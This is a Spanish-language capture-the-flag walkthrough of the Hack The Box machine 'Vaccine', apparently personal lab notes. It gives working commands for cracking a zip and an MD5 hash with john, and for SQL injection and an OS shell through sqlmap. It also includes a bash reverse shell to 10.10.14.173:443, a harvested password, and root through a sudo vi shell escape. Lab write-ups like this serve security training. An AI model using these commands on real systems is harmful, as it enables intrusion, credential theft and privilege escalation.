# Vaccine

10.129.163.110
nmap -sCV -Pn 10.129.163.110 -> 21 -> FTP // 22 -> Ssh // 80 -> HTTP
Tiene anonymous FTP LOGIN ALLOWED!!! -> nos traemos un .zip que está cifrado.
zip2jhon backup.zip -> pillamos el hash.txt y ahora lo desciframos
usamos john (johntheripper) para descifrar el hash -> y obtenemos la pw del .zip

trae un archivo .php y un .css -> nos interesa el index.php
sacamos una conexión y vemos user y contraseña -> admin  + 2cb42f8734ea607eefed3b70af13bbd3 (cifrado md5) -> La contraseña tiene que ser esto
echo '2cb42f8734ea607eefed3b70af13bbd3' > hash.txt -> guardamos el hash md5 raw y lo deshasehamos -> john hash.txt --format=Raw-MD5 -w=/usr/share/wordlists/rockyou.txt
Vamos a la web y probamos credenciales -> nos da el login  a http://10.129.163.110/dashboard.php


SOlo vemos un panel con productos y buscador y vemos que tiene parametro saerch?
probamos SQLi http://10.129.163.110/dashboard.php?search=ASDF%27%20OR%201=1; y devuelve  ERROR: syntax error at or near "%" LINE 1: Select * from cars where name ilike '%ASDF' OR 1=1;%'

SQLMAP -> sqlmap -u "http://10.129.163.110/dashboard.php?search=ASDS" --cookie="PHPSESSID=q211mpj0doo42l5ukl97fhj4np" -p search --batch
en el log nos indica que es postgresql y ha encontrado dos payoads -> Type: stacked queries Type: UNION query

Y si utilizamos -> sqlmap -u "http://10.129.163.110/dashboard.php?search=ASDS" --cookie="PHPSESSID=q211mpj0doo42l5ukl97fhj4np" --os-shell -> tenemos una shell

-> nos envimaos a nosotros reverse shell bash -c "bash -i >& /dev/tcp/10.10.14.173/443 0>&1" + nc -nlvp 443

-> Hacemos ID y pillamos command standard output: 'uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)'

Miramos rutas y hacemos ls para ver que archivos hay y vemos que en posstgresql esta la flag del user.

Miramos también en /var/www/html y dashboard.php -> P@s5w0rd! para  postgres

hacemos ssh postgres@10.129.163.110 por que la shell se cierra a los 2/3min
y procedemos a ver que podemos hacer para escalar privilegios
sudo -l  -> atching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET",
    env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:~$ 

Esto significa que podemos usar el binario vi para poder (editor de texto) en el archivo -> /etc/postgresql/11/main/pg_hba.conf
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -> y abrimos un editor vi con sudo
procedemos a escribir :set shell=/bin/sh y luego :shell y ya somos root :)
